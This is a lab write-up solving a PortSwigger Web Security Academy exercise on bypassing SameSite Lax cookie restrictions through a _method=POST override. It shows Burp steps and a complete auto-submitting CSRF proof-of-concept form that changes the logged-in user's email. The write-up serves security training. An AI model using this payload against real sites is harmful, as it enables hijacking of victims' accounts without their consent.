## Lab Description: SameSite Lax bypass via method override

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/2591f2ef-6cec-4684-ba8c-0798eba59637)

## Solution: 

Go to My-Account and Log In to the account with the above credentials and change your email address.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f249ba35-c937-4d19-a959-b8e3ff5903a6)

Send the POST /my-account/change-email request to Burp Repeater.And Study the POST /my-account/change-email request and 
notice that this doesn't contain any unpredictable tokens so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/3630dd9b-2d9a-44ee-a539-ec0e9d52700b)

Look at the response to your POST /login request. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. 
As a result, the browser will use the default Lax restriction level.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8e31717b-5ad2-4e4a-bf13-af89dfc49f20)

Recognize that this means the session cookie will be sent in cross-site GET requests, as long as they involve top-level navigation.

In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.
And send the request. Observe that the endpoint only allows POST requests.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8ee9a52d-66b3-407d-a8be-2869bcd340f8)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/9fb8072a-ab60-463e-b210-b3d0e893700b)

Try overriding the method by adding the _method parameter to the query string:
```
/my-account/change-email?email=foo%40web-security-academy.net&_method=POST
```
Send the request. Observe that this has been accepted by the server.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/2c92a17e-f57f-4ef0-ad54-6cad61f088c5)

Now Generate POC for this request to Bypass Samesite Cookie

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b5fd7940-4fa1-4eca-a882-8c1d56188b6f)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3d007b045ae83d80e65da0004500ce.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="cyber123&#64;gmail&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/72b389d1-f283-457f-a1ee-f82fbcdb3fa5)

Hence We Solved our Lab

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/fa95736a-228b-4a45-a8ca-aed23da1d053)

